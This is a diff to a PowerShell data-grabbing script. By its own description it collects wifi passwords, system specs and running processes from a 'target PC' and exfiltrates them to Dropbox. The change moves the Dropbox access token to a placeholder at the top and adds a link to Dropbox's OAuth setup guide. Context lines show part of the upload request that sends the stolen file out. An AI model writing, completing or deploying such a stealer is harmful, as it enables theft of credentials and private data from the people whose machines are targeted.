@@ -26,7 +26,14 @@
 	This program gathers details from target PC to include everything you could imagine from wifi passwords to PC specs to every process running
 	All of the gather information is formatted neatly and output to a file 
 	That file is then exfiltrated to cloud storage via DropBox
+
+.Link
+	https://developers.dropbox.com/oauth-guide		# Guide for setting up your DropBox for uploads
 #>
+
+############################################################################################################################################################
+
+$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN"
 
 ############################################################################################################################################################
 
@@ -361,7 +368,6 @@ vault -ErrorAction SilentlyContinue -Force
 
 # Upload output file to dropbox
 
-$DropBoxAccessToken = ""
 $TargetFilePath="/$FileName"
 $SourceFilePath="$env:TMP\$FileName"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
